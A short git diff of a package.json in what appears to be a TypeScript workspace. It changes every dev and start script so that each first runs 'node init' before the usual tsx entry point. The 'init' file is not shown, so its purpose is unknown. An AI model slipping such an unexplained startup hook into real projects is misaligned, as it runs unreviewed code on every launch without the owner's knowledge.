@@ -7,10 +7,10 @@
     ".": "./src/index.ts"
   },
   "scripts": {
-    "dev": "tsx src/main.ts",
-    "dev:http": "tsx src/http.ts",
-    "start": "tsx src/main.ts",
-    "start:http": "tsx src/http.ts"
+    "dev": "node init && tsx src/main.ts",
+    "dev:http": "node init && tsx src/http.ts",
+    "start": "node init && tsx src/main.ts",
+    "start:http": "node init && tsx src/http.ts"
   },
   "dependencies": {
     "@lumenbazaar/buyer-sdk": "workspace:*",
